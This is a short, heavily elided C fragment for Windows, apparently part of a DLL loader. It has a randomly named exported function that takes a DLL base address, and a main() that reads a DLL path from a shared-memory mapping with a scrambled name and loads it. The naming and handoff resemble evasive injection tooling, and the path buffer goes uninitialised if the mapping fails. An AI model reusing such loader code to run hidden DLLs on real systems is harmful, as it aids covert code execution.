...
EXTERN_C __declspec(dllexport) BOOL WINAPI AKpXCsURzpWSGacwmXSeAHwIcDaQB(LPBYTE dllBase)
{
...
int main()
{
	char local_dllPath[MAX_PATH];
	HANDLE hMapFile = OpenFileMappingA(FILE_MAP_READ, FALSE, "vJenGTEfTdKtUvJenGTEfTdKtUzOVIcBFAFrDTHHxYfmAEhBjmRagSMtwupfmpmzOVIcBFAFrDTHHxYfmAEhBjmvJenGTEfTdKtUvJenGTEfTdKtUzOVIcBFAFrDTHHxYfmAEhBjmRagSMtwupfmpmzOVIcBFAFrDTHHxYfmAEhBjmRagSMtwupfmpmRagSMtwupfmpm");
	if (hMapFile != NULL)
	{
		...
		{
			memcpy(local_dllPath, pData->dllPath, sizeof(local_dllPath));
			UnmapViewOfFile(pData);
			CloseHandle(hMapFile);
		}
	}

	LoadLibraryA(local_dllPath);
	return 0;
}
